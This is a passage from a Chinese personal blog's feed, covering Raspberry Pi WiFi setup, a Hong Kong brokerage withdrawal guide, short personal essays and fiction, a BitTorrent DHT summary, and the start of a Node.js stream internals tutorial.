分区新建个ssh文件夹即可，包括完整版和 lite 版。</p></blockquote><p>好吧，只能说，“板子，我服你~”。最后看到了这个界面，心情就舒畅多了：</p><p><img src="/../blogimgs/2018/06/14/2018-06-12-18-13-07.png" alt="image"></p><h3 id="自动-WiFi-链接"><a href="#自动-WiFi-链接" class="headerlink" title="自动 WiFi 链接"></a>自动 WiFi 链接</h3><p>执行 <code>iwlist scan</code> 对于没有无线网卡驱动的板子，会提示错误，当然也可能是没有打开 WiFi，可以通过 <code>sudo ifup wlan0</code> 开启。</p><p>自动 WiFi 链接分为两步，首先将 <code>/etc/network/interfaces</code> 中的手动连接修改成自动，修改方式：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- iface wlan0 inet manual</span></span><br><span class="line"><span class="deletion">- wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</span></span><br><span class="line"><span class="addition">+ iface wlan0 inet dhcp</span></span><br><span class="line"><span class="addition">+ wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf</span></span><br></pre></td></tr></table></figure><p>第二步，在 <code>/etc/wpa_supplicant/wpa_supplicant.conf</code> 中设置需要连接的 WiFi 名和密码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nework=&#123;</span><br><span class="line">[TAB]ssid=<span class="string">&quot;WIFI_NAME&quot;</span></span><br><span class="line">[TAB]psk=<span class="string">&quot;WIFI_PASSWORD&quot;</span></span><br><span class="line">[TAB]priority=1</span><br><span class="line">&#125;</span><br><span class="line">nework=&#123;</span><br><span class="line">[TAB]ssid=<span class="string">&quot;WIFI_NAME_2&quot;</span></span><br><span class="line">[TAB]psk=<span class="string">&quot;WIFI_PASSWORD_2&quot;</span></span><br><span class="line">[TAB]priority=2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>[TAB]</code> 为 tab 符号输入；可以设置多个 WiFi，其中 priority 为优先级，<strong>直接在文件后加入这些配置，原有的内容不要动</strong>。</p><p>这里需要注意的是，如果你的板子正通过网线与电脑连接，此时 eth0 已经处于链接状态，wlan0 是无法连接的；需要你断开网线，然后重启板子，才能连接 WiFi。</p><hr><p>好吧，今天就折腾到这里，下一节，我们来看一看如何通过外接的蓝牙音箱播放树莓派音乐。</p>]]></content>
      
      
      <categories>
          
          <category> 硬件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系列 - 入坑树莓派（一）</title>
      <link href="/blog/2018/06/12/rasyberry-pi-start/"/>
      <url>/blog/2018/06/12/rasyberry-pi-start/</url>
      
        <content type="html"><![CDATA[<p>树莓派，是一款基于 Linux 的单板机，配上一些可交互的硬件设备（扩展屏、鼠标、键盘等），也就成了一款配置略低的电脑。</p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>电脑能做什么事情不必多说，倘若买一块树莓派的板子就是为了玩软件、学习 Linux 系统，那就有点太无趣了；我的目标是通过树莓派深入了解它的 IO 引脚控制（包括几个总线通讯协议）及各类硬件传感器的使用，尝试写写 Linux 内核驱动，再顺便回顾下大学里学的电路原理课程，最终目的是通过各种软硬件的组合实现一些小创意，帮助改善生活质量。</p><p>当然，我可以去直接网上购买智能家具家电，不过其中的趣味想必就少了许多，而且脑海中的一些创意还没有被小米这样的厂商产品化，只能自己动手实现啦~</p><h3 id="趣味和挑战"><a href="#趣味和挑战" class="headerlink" title="趣味和挑战"></a>趣味和挑战</h3><p>从正式接触编程到如今，也有 7 个年头了，Linux 系统，包括系统上的各种环境配置、软件使用，可以说熟悉的不能再熟悉了，我对系统底层的东西（系统、内核）兴趣度不高，所以把应用层尤其是软件摸索的差不多了，Linux 也就用的少了，毕竟它不适合平时办公和娱乐。</p><p>树莓派提供的 IO 引脚可以直接控制底层硬件，通过硬件的配套驱动，可以在操作系统层做很多非常有意思的软硬件联动开发，相比单纯把玩应用层和协议层的东西，能够控制实物硬件，还是很有趣味性的。不过有趣的同时，也会有很多挑战，比如电路设计、驱动开发、硬件通讯协议的研究等等。</p><h3 id="上货"><a href="#上货" class="headerlink" title="上货"></a>上货</h3><p>没做太多的调研，问了下身边搞 IoT 开发的同事，让他直接推了几个淘宝链接。</p><p><strong>一个 Raspberry Pi 3 Model B+ Linux 开发板</strong></p><p><img src="/../blogimgs/2018/06/12/2018-06-12-15-19-41.jpg" alt="image"></p><p><strong>一盒子感应器，三四十个</strong></p><p><img src="/../blogimgs/2018/06/12/2018-06-12-15-20-29.jpg" alt="image"></p><p>上面的硬件，淘宝上随随便便就可以搜到，没什么太大的差异，就不贴链接了，如果一定要推荐，可以在 <a href="https://www.raspberrypi.org/products/#buy-now-modal">官方授权的淘宝店</a> 上购买。我们来看看这块<strong>板子的配置</strong>：</p><p><img src="/../blogimgs/2018/06/12/2018-06-12-16-00-28.png" alt="image"></p><p>这块最新的树莓派板载蓝牙和 WiFi 模块，而且各方面的性能都还不错，提供了 4 个 USB 接口和一个全尺寸的 HDMI 接口，基本上可以满足我们的日常开发需求。</p><h3 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h3><p>在小米商城买了四五十件智能产品，说实话，小米的产品确实不错，提供的米家 APP 操作起来也十分方便，但是小米的智能家电无法对外提供服务，只能在小米的体系内运转，因此就显得过于薄弱了些。</p><p>把玩树莓派，我大致给自己定下这么几个目标：</p><ul><li>熟练使用 GPIO 和各类总线协议进行硬件和设备的连接、控制</li><li>了解常见的标准数据传输协议，如蓝牙传输、红外遥控、AirPlay 等</li><li>掌握基本的 Linux 内核驱动开发的过程，并尝试为硬件编写驱动程序</li><li>了解边缘计算的整体架构，将家里的所有设备集结在一个端上控制，争取上云</li></ul><hr><p>下一节来说说，如何进入到自己熟悉的远程开发模式。</p>]]></content>
      
      
      <categories>
          
          <category> 硬件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中银国际提款到香港招行一卡通</title>
      <link href="/blog/2018/05/30/%E4%B8%AD%E9%93%B6%E5%9B%BD%E9%99%85%E6%8F%90%E6%AC%BE%E5%88%B0%E9%A6%99%E6%B8%AF%E6%8B%9B%E8%A1%8C%E4%B8%80%E5%8D%A1%E9%80%9A/"/>
      <url>/blog/2018/05/30/%E4%B8%AD%E9%93%B6%E5%9B%BD%E9%99%85%E6%8F%90%E6%AC%BE%E5%88%B0%E9%A6%99%E6%B8%AF%E6%8B%9B%E8%A1%8C%E4%B8%80%E5%8D%A1%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<p>用过中银国际的人都知道，它是一个很渣的平台，至于渣到什么程度，有机会你可以去体会一下。</p><p><img src="/../blogimgs/2018/05/30/transfer-money.png" alt="提款"></p><p>如果你从来没有玩过股票（或炒币）、没有换过汇，折腾起来还是有点费力的，下面我用通俗一点的话来简单说一说大致的流程。</p><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><p>我们把交易的前置流程省略掉 —— 默认你不会傻到把钱转入中银国际，然后在这个渣平台上购买股票。</p><p>在中银国际上支持美元、港元和人民币交易，交收日是 <code>T+2</code>，比如你当天卖出股票，两天后钱才会到账，这两天中你的钱会出现在「未交收金额」一栏中，不可用。</p><p>如果你点子比较低，遇到了他们的公众假期或者周六、周日，那么对不起，<code>T+2</code>，就会变成 <code>T+2+假期时间</code>，往后顺延…</p><h3 id="提现"><a href="#提现" class="headerlink" title="提现"></a>提现</h3><p>先说说你有香港银行卡的情况，如果你有香港的银行卡，提现就稍微方便一点。</p><p>首先，你需要去它的官网上下载一份 <a href="http://www.bocionline.com/files/Change_of_Personal_Particular_and_AE_Form.pdf">PDF 文档</a>，填写你的香港银行卡信息，然后拍照发送到  <a href="mailto:&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;&#64;&#98;&#x6f;&#99;&#x69;&#x67;&#x72;&#111;&#x75;&#x70;&#46;&#99;&#111;&#109;">&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;&#64;&#98;&#x6f;&#99;&#x69;&#x67;&#x72;&#111;&#x75;&#x70;&#46;&#99;&#111;&#109;</a>，大概一周左右可以完成香港银行卡的绑定。</p><p>绑定好了以后，在你的中银国际提款界面就可以发现香港银行卡的选项了。提现需要 1~2 天，如果遇到公休日，顺延…</p><p>如果你没有香港银行卡，你需要下载一份 <a href="http://www.bocionline.com/files/payment_instruction_en.pdf">PDF 文档</a>，填写你的转账信息，然后拍照发到上面那个邮箱，到时候会扣你 200 港元或者 25 美金的电汇手续费，然后等待 3~5 天完成提现。</p><h3 id="换汇"><a href="#换汇" class="headerlink" title="换汇"></a>换汇</h3><p>第一次打开香港一卡通的客户端也是略微有点懵逼的，不过知道各个菜单项是什么意思了，感觉也还好。关于香港一卡通的办理和使用，我之前写过一篇<a href="/blog/2016/07/07/hongkong-cmbchina/">随笔</a>。</p><p>需要注意的是，每人每年只有 5w 刀的的结汇额度，你可以在香港一卡通上把美金&#x2F;港币换成人民币（这个过程成为之换汇）再转入到国内银行，也可以先转入国内银行再换汇（或者不换汇直接使用）。前者会占用结汇额度，不需要手续费（人民币转账不需要手续费），而美金&#x2F;港币转账需要收取每笔 11 美金或者 80 港币的手续费。</p><p>大部分情况消费都是人民币，所以你可以在香港一卡通换汇完成后再转入国内。这个过程，没有时延，都是及时到账。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>整个流程，不得不说很折腾，中银国际只有网页客户端，手机 iOS 客户端不支持美元账户操作，而且使用的都是上古风，80 年代的交互模式，特别恶心；所以很多人都会选择把中银国际中的股票转移到富途牛牛类似的客户端上操作，体验真的好多了。</p><p>香港一卡通也有点恶心，客户端只支持 Windows，而且还需要一个 uKey 操作，虽说保证了安全，但是体验也是一坨翔。</p><p>上次更新证书还除了点小毛病，香港专业客户端更新总是失败，客服告诉我先安装招行专业版客户端，更新证书，此操作对香港专业客户端也生效。</p><p>中银国际恶心的地方除了每次要等待几天以外，客服电话也长期占线，排队打不通。如果你有问题，还是建议通过上面提到的邮件沟通，一般都会回复。</p><p>好吧，就记录这么多；读者有什么问题多去问客服吧，或者网上检索下。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 香港一卡通 </tag>
            
            <tag> 中银国际 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陪伴</title>
      <link href="/blog/2018/03/01/%E9%99%AA%E4%BC%B4/"/>
      <url>/blog/2018/03/01/%E9%99%AA%E4%BC%B4/</url>
      
        <content type="html"><![CDATA[<p>正值初春，不到七点夜幕就被揪了下来，窗户已挂上了一层宁静的夜色。</p><p>“都过了晚饭时间了，怎么还没回来。”，她心里嘀咕着。</p><p><img src="/../blogimgs/2018/03/01/%E9%99%AA%E4%BC%B4.png" alt="图自https://gfamily.cwgv.com.tw/public/upload/articles/98/998/preview/998.png"></p><p>子涵是一家互联网公司的员工，每天忙到三餐只顾得上早餐，还是老婆给准备的，这不，今天又把晚饭时间贡献给了业务。每到饭点，子涵的老婆夏月就会给他打一个电话，真切地问清楚，到底吃了没。</p><p>南方的天气过了冬便开始古怪起来，白天太阳晒得人懒洋洋的，到了夜里就凉飕飕，门缝还时不时吹响口哨。一间小室，一个人，还是显得太大了。</p><p>六点多，子涵的手机拨进过一个电话，震动响起时，子涵正皱着眉头盯着电脑屏幕，左手伸过去准备取手机，一条消息弹了出来，又把手收了回来；键盘敲下几个字后，案头的震动声没了，就把这事儿给忘了。那是夏月打过来的，家里的做好的饭菜都快凉了。</p><p>“什么？还要改！这个地方都改了三遍了，能不能悠着点啊…”，子涵在电话里吼了起来，“确定的部分就不要再改了，没确定的部分先别提过来，咱们尽量把有限的时间投在有价值的事情上，生命太短暂！”。项目室内一直弥漫着紧张的气息，有点让人喘不过气来。这个项目的需求是倒推着时间来的，上线节奏早就定好了，大家都很无奈。</p><p>电脑上飘出一条消息，“不要你了！（来自老婆）”，子涵瞟了一眼，点击了关闭，继续埋头敲打着键盘。</p><p>今天是周五，子涵本来答应了早点回家吃饭的，不过看今天的情形是有点够呛了。点开微信，回复了一句：“你先吃吧。” 回车键刚按下，夏月就发来了一条新消息：“等你。”</p><p>（未完待续）</p><hr><p>题图：<a href="https://gfamily.cwgv.com.tw/public/upload/articles/98/998/preview/998.png">https://gfamily.cwgv.com.tw/public/upload/articles/98/998/preview/998.png</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 陪伴 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有点强迫症的程序员</title>
      <link href="/blog/2018/02/27/%E6%9C%89%E7%82%B9%E5%BC%BA%E8%BF%AB%E7%97%87%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98/"/>
      <url>/blog/2018/02/27/%E6%9C%89%E7%82%B9%E5%BC%BA%E8%BF%AB%E7%97%87%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98/</url>
      
        <content type="html"><![CDATA[<p>宪法修改提案事件在网络上沸沸扬扬，没怎么凑热闹，也不打算（bù gǎn）凑热闹了，还是安安静静地在自留地写点东西好了。</p><p><img src="/../blogimgs/2018/02/27/%E5%BC%BA%E8%BF%AB%E7%97%87.png" alt="图自：http://cdn.kickvick.com/wp-content/uploads/2015/07/ocd-imperfection-05.jpg"></p><p>工作时不时需要打开别人的仓库，看到好的代码会精神振奋，上下翻动之余内心也会不停地发出由衷的赞叹，而看到乱糟糟的代码，嘴里就只剩下唏嘘了。一眼扫下去如何判定代码是好是坏呢？大致感觉是这样：</p><ul><li>首先会看基本面，空行是不是工整一致，注释是否清晰，行文是否流畅，上下逻辑是否连贯，好的代码一定会看着特别舒服；</li><li>然后就是细节啦，看过有代码洁癖的 PHP 程序员写的代码，他们对变量命名、逻辑判断先后顺序、函数分段等各方面都有着自己的思考，那种代码用「优美」来形容完全不过分！</li><li>最后才是代码逻辑，逻辑是整个代码结构设计的核心，它表达出来的是作者的思想。</li></ul><p>程序员的信仰是什么？我觉得就是<strong>逻辑</strong>。因为这个信仰，我们可以坚定地告诉别人，这里是正确的，或者这里是错误的。</p><p>我相信很多程序员会不止一次地阅读自己的代（zuò）码（pǐn），有时候想到一个简洁的表达方式，会很激动地删掉一堆冗余逻辑，用几行精简的逻辑替换掉，而且内心还会洋溢着分享的冲动。程序员们在这种习惯中无数次地薰陶后，强迫症自然也就来了。</p><ul><li>电脑桌面的文件夹必须放在第 2 排第 1 个位置，因为更好找</li><li>结婚照必须斜交 45° 对着沙发</li><li>书桌上水杯一定要摆在右手边 30cm 的位置</li></ul><p>生活中会不断地挖掘对称美的地方，而且一定会想尽办法减少重复的工作。<strong>仿佛生活就是编码，逻辑贯穿其中。</strong></p><p>强迫症会让人做出一些看似不可思议的事情，这是强迫症者的生活哲学。他们可以为了偷懒，让自己比平时更忙；他们宁愿丧失部分质量，也不愿意牺牲心中的美；他们钟爱变化，会一直在平淡的生活中寻找趣味的内容。他们是可爱的人。</p><hr><p>题图：<a href="http://cdn.kickvick.com/wp-content/uploads/2015/07/ocd-imperfection-05.jpg">http://cdn.kickvick.com/wp-content/uploads/2015/07/ocd-imperfection-05.jpg</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强迫症 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>乌镇溜达小记</title>
      <link href="/blog/2018/02/25/%E4%B9%8C%E9%95%87%E6%BA%9C%E8%BE%BE%E5%B0%8F%E8%AE%B0/"/>
      <url>/blog/2018/02/25/%E4%B9%8C%E9%95%87%E6%BA%9C%E8%BE%BE%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>去年花时间最多的一件事情就是<strong>拿证</strong>，可以说拿到手软，加上人变得懒散了一些，博客更新也就少了些许。今年我准备转换下画风，生活类的记录多一点，技术类的总结来一点，技术细节的研究就尽量不写了~</p><p>17 年过年没有回老家，把岳父岳母请到了杭州，也算是给新家增加点人气吧（其实是为了照顾怀孕的老婆😂）。一家人，从杭州余杭区到乌镇一路高速，单程一个半小时:</p><p><img src="/../blogimgs/2018/02/25/way-from-hz-to-wz.jpg" alt="杭州余杭到乌镇"></p><p>乌镇有好几个风景区，其中最大的是西栅风景区，其次是东栅，既然是过去凑热闹，当然选大的啦~</p><p>十点半出发，到的时候已经是中午了，把车停在景区中心五里开外的地方，窜进一个小巷子，打算先把肚子填饱：</p><p><img src="/../blogimgs/2018/02/25/wz-resturant.jpg" alt="乌镇小菜馆"></p><p>这已经是附近评分最高的一家小菜馆了，说实话，有点心疼乌镇人民😪。<span class="barretSay">&#x2F;&#x2F; 饭吃饱了就犯困，这可能是胖子们的独有特征吧…</span></p><p>拿着门票在门口瞎转悠了几分钟，没啥意思，果断地，在进门大概 50m 的小亭子里买了船票，我是绝不愿意在熙熙攘攘的人群中磨肩擦掌的，所以今天陆路就免了，水上游一圈还自罢了。</p><p><img src="/../blogimgs/2018/02/25/wz-01.jpg" alt="乌镇景色 - 01"></p><p><strong>水上空船不少，路上皆是行人。</strong>庆幸把前几天买到的自拍杆捎上了，不然坐在船里头，伸不了头也不让走出船舱，甚是蛋疼。</p><p><img src="/../blogimgs/2018/02/25/wz-02.jpg" alt="乌镇景色 - 02"></p><p>江南水乡嘛，原汁原味地保留了一篇古风古韵，船两侧尽是这般景色，</p><p><img src="/../blogimgs/2018/02/25/wz-03.jpg" alt="乌镇景色 - 03"></p><p>拍了不少照片，没几张入眼的，就不继续晒了。水上漂了半个钟头，已是睡意朦胧，只想早点回家，无奈岳父大人还想再逛逛，只好蹒跚跟随。</p><p><img src="/../blogimgs/2018/02/25/wz-04.jpg" alt="乌镇到此一游照"></p><p>最后不得不吐槽一下，出口真尼玛难找！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 笔记本 </category>
          
          <category> 在路上 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乌镇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三年醇</title>
      <link href="/blog/2017/08/29/memory-overflow/"/>
      <url>/blog/2017/08/29/memory-overflow/</url>
      
        <content type="html"><![CDATA[<div class="music" data-id="24716501" data-index="0"></div><p>快三个月没写博客了，长草了。最近生活和工作上都发生了不少事情，在这个百感交集的夜晚，突然想说点什么。</p><p><img src="/../blogimgs/2017/08/29/6c0378f8gy1fj0wyhwtf1j20p00dw775.jpg" alt="overlook via https://unsplash.com/search/photos/overlook?photo=bSmKli4OTIY"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fj0wyhwtf1j20p00dw775.jpg">--></p><span id="more"></span><p>首先，要给大家公布一个事儿，小胡子哥在昨天已经彻底结束单身生活，迈向了婚姻的殿堂，从此将走向人生巅峰 😛；非常感谢各位朋友的发来的祝福，<span style="letter-spacing:3px;">请收下我的膝盖！</span></p><p>生活就是如此，总是在不经意间给人数不清的惊喜。</p><p>毕业没多久便在 <a href="http://d2forum.alibaba-inc.com/">D2</a> 上认识了 <a href="http://weibo.com/yixuanzmx">她</a>，一个东北女孩，懵懵懂懂的，稀里糊涂就被我忽悠到了杭州——这个「只有我」的城市。经过我三番五次的穷追猛打，几个月下来，她已经略显「疲惫」，渐渐地，露出了爱意。那一年，仿佛自己又回到了 18 岁。</p><p>从相识到相知到相恋，我们留下了不少美好的回忆；那一阵子的甜蜜后，两个人也开始了小吵小闹，进入一段爱情磨合期。细细品来，这也算是生活的乐趣吧~</p><p>前段时间，公司系统邮件提醒我，三年了。</p><p>我时常拷问自己，我要去哪里？这三年就是摸索过来的，不断给自己设定目标、调整方向、探索前路；也十分感激在路上给我指点迷津的各位前辈，把迷茫的我从沟里带出来，让我倍受这个社会的温暖。</p><p>还记得，刚毕业那会儿整个人是一愣一愣的，感觉自己做什么事情都不周全，尽管很卖力地干，劲却使不上道。所以我也学会了观察，看别人是怎么做的，学习后模仿，模仿后学习，慢慢地，好像很多事情做起来突然就顺手了，也不知是自己开窍了，还是思维惯性了 🙄。</p><p>最怕没有目标，浑浑噩噩的，没了冲动，也没了激情，自然任何事情都干不到 90 分。</p><p>去年一年在社交上投入了太多的精力，信息在大脑里爆炸，让我有点分不清主次；说太多，做太少，让我落下了不少的功课，笔杆子还是要拿起来，写点实实在在的东西。今年，尤其是下半年，我会作出一些变化。</p><p>在阿里巴巴，会把工作的人比作一坛酒，一年香，三年醇，五年陈。前三年，是一个人绝佳的成长期，而三年到五年，应该去沉淀一些东西，我想，我到了这个阶段了。</p><p>做技术就像搞建筑一般，根基越深厚，上层建筑越牢固，也能建得更高。在往后的技术发展路上，我会遵循「巩固基层，拓宽中层，探索上层」的原则，扎扎实实地搞，一步一个脚印。</p><p>毕业三年，事在发展，人在变化。期待未来。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 在路上 </category>
          
          <category> 观点和感想 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三年 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BitTorrent DHT 协议简述</title>
      <link href="/blog/2017/06/16/bittorrent-dht-protocal/"/>
      <url>/blog/2017/06/16/bittorrent-dht-protocal/</url>
      
        <content type="html"><![CDATA[<p>BitTorrent DHT 协议原理还是比较好理解的，内容不多，本文把基本的介绍、规则和路由表维护规则做了简述，方便理解。官方文档：<a href="http://www.bittorrent.org/beps/bep_0005.html">http://www.bittorrent.org/beps/bep_0005.html</a></p><p><img src="/../blogimgs/2017/06/16/6c0378f8gy1fgn4e4xjodj20rs0flaap.jpg" alt="bitTorrent"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fgn4e4xjodj20rs0flaap.jpg">--></p><span id="more"></span><h3 id="Brif（简介）"><a href="#Brif（简介）" class="headerlink" title="Brif（简介）"></a>Brif（简介）</h3><p>DHT, distributed sloppy hash tabl.</p><ol><li>BT 协议像 TCP&#x2F;IP 协议一样是一个协议簇</li><li>DHT 协议是在 UDP 通信协议的基础上使用 Kademila（俗称 Kad 算法）算法实现</li><li>Tracker 服务器保存和 torrent 文件相关的 peer 的信息</li><li>一个 peer 节点是一个实现了 BT 协议并且开启了 TCP 监听端口的 BT 客户端或者服务器</li><li>一个 node 节点是一个实现了 DHT 协议并且开启了 UDP 监听端口的 BT 客户端或者服务器</li><li>DHT 由很多 node 节点以及这些 node 节点保存的 peer 地址信息组成</li><li>一个 BT 客户端包括了一个 DHT node 节点，通过这些节点来和 DHT 网络中的其它节点通信来获取 peer 节点的信息，然后再通过 BT 协议从 peer 节点下载文件</li><li>DHT 协议通过从附近的 node 节点获取 peer 信息，而不是从 tracker 服务器获取 peer 信息，这就是所谓的 trackerless.</li></ol><h3 id="Principle（规则）"><a href="#Principle（规则）" class="headerlink" title="Principle（规则）"></a>Principle（规则）</h3><ol><li>Node 节点必须保存一份 Routing Table（路由表） 和 DHT 网络中一小部分节点交流的信息</li><li>Node 在发起种子下载请求时，会根据 IP 生成 token 标识自己在下载</li><li>当某个 Node 节点想找某个种子的 peer 信息时，通过 Kad 获取最近 Node 节点信息，带上 token 后进行通讯</li><li>下一个最近 Node 节点中有 peer 信息则直接验证 token 返回，否则继续传播这个信息</li><li>token 有效时间是 10 分钟</li></ol><h3 id="Routing-Table（路由表）"><a href="#Routing-Table（路由表）" class="headerlink" title="Routing Table（路由表）"></a>Routing Table（路由表）</h3><ol><li>每一个节点都维护一个路由表保存一些已知的通信好的节点</li><li>一个活跃的节点就是能在 15 分钟之内响应过请求或者在 15 分钟之内发送过请求的节点</li><li>路由表可以被划分为 buckets（桶），每一个 bucket 包含一个子部分的 nodeID 空间</li><li>buckets 可以装 node 节点信息</li><li>通讯不好的节点会从 buckets 中被剔除</li><li>刚初始化的节点中路由表为空</li><li>一般会通过解析一个 .torrent 文件来获取 peer 信息，从而构建路由表</li></ol><p>还有 KPRC 协议，比较细节，就没有详述了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHT </tag>
            
            <tag> BitTorrent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解 Node Stream 内部机制</title>
      <link href="/blog/2017/06/06/dive-to-nodejs-at-stream-module/"/>
      <url>/blog/2017/06/06/dive-to-nodejs-at-stream-module/</url>
      
        <content type="html"><![CDATA[<p>相信很多人对 Node 的 Stream 已经不陌生了，不论是请求流、响应流、文件流还是 socket 流，这些流的底层都是使用 <code>stream</code> 模块封装的，甚至我们平时用的最多的 <code>console.log</code> 打印日志也使用了它，不信你打开 Node runtime 的源码，看看 <a href="https://github.com/nodejs/node/blob/master/lib/console.js#L82-L109"><code>lib/console.js</code></a>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">ignoreErrors, stream, string, errorhandler</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  stream.<span class="title function_">once</span>(<span class="string">&#x27;error&#x27;</span>, noop);</span><br><span class="line">  stream.<span class="title function_">write</span>(string, errorhandler);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Console</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">log</span> = <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">_ignoreErrors</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_stdout</span>,</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;util.format.apply(<span class="literal">null</span>, args)&#125;</span>\n`</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_stdoutErrorHandler</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Stream 模块做了很多事情，了解了 Stream，那么 Node 中其他很多模块理解起来就顺畅多了。</p><blockquote><p>本文代码和图片可以在这里取用：<a href="https://github.com/barretlee/dive-into-node-stream">https://github.com/barretlee/dive-into-node-stream</a>。</p></blockquote><h3 id="stream-模块"><a href="#stream-模块" class="headerlink" title="stream 模块"></a>stream 模块</h3><p>如果你了解 <a href="https://zh.wikipedia.org/zh-hans/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98">生产者和消费者问题</a> 的解法，那理解 stream 就基本没有压力了，它不仅仅是资料的起点和落点，还包含了一系列状态控制，可以说一个 stream 就是一个状态管理单元。了解内部机制的最佳方式除了看 <a href="https://nodejs.org/api/stream.html">Node 官方文档</a>，还可以去看看 Node 的 <a href="https://github.com/nodejs/node/blob/master/lib/">源码</a>：</p><ul><li><code>lib/module.js</code></li><li><code>lib/_stream_readable.js</code></li><li><code>lib/_stream_writable.js</code></li><li><code>lib/_stream_tranform.js</code></li><li><code>lib/_stream_duplex.js</code></li></ul><p>把 <code>Readable</code> 和 <code>Writable</code> 看明白，Tranform 和 Duplex 就不难理解了。</p><h3 id="Readable-Stream"><a href="#Readable-Stream" class="headerlink" title="Readable Stream"></a>Readable Stream</h3><p>Readable Stream 存在两种模式，一种是叫做 <code>Flowing Mode</code>，流动模式，在 Stream 上绑定 ondata 方法就会自动触发这个模式，比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> readable = <span class="title function_">getReadableStreamSomehow</span>();</span><br><span class="line">readable.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Received <span class="subst">$&#123;chunk.length&#125;</span> bytes of data.`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个模式的流程图如下：</p><p><img src="/../blogimgs/2017/06/06/node-stream-readable-flowing.png" alt="Flowing"></p><p>资源的数据流并不是直接流向消费者，而是先 push 到缓存池，缓存池有一个水位标记 <code>highWatermark</code>，超过这个标记阈值，push 的时候会返回 <code>false</code>，什么场景下会出现这种情况呢？</p><ul><li>消费者主动执行了 <code>.pause()</code></li><li>消费速度比数据 push 到缓存池的生产速度慢</li></ul><p>有个专有名词来形成这种情况，叫做「背压」，Writable Stream 也存在类似的情况。</p><p>流动模式，这个名词还是很形象的，缓存池就像一个水桶，消费者通过管口接水，同时，资源池就像一个水泵，不断地往水桶中泵水，而 highWaterMark 是水桶的浮标，达到阈值就停止蓄水。<br>下面是一个简单的 Demo：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Readable</span> = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>).<span class="property">Readable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stream 实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyReadable</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Readable</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">dataSource, options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(options);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">dataSource</span> = dataSource;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 继承了 Readable 的类必须实现这个函数</span></span><br><span class="line">  <span class="comment">// 触发系统底层对流的读取</span></span><br><span class="line">  <span class="title function_">_read</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span 